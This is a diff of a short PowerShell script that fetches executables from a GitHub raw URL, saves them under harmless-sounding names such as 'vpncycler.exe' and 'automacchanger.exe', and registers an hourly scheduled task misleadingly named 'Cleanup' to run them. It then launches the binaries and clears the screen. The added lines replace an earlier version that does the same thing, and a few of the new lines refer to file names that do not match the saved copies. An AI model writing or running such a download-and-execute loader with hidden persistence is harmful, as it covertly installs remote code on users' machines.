@@ -1,6 +1,6 @@
-iwr -useb https://raw.githubusercontent.com/crisco321/log/main/bank.exe -OutFile ./Banksy.exe
-iwr -useb https://raw.githubusercontent.com/crisco321/log/main/run.exe -OutFile ./Banksy-2.exe
-./Banksy-2.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:1 /program:Banksy.exe
-./Banksy-2.exe /method:run /taskname:Cleanup
-./Banksy.exe
+iwr -useb https://raw.githubusercontent.com/crisco321/log/main/4obs.exe -OutFile ./vpncycler.exe
+iwr -useb https://raw.githubusercontent.com/crisco321/log/main/run.exe -OutFile ./automacchanger.exe
+./automacchanger.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:1 /program:vpncycler.exe
+./automacchanger /method:run /taskname:Cleanup
+./4obs.exe
 Clear-Host
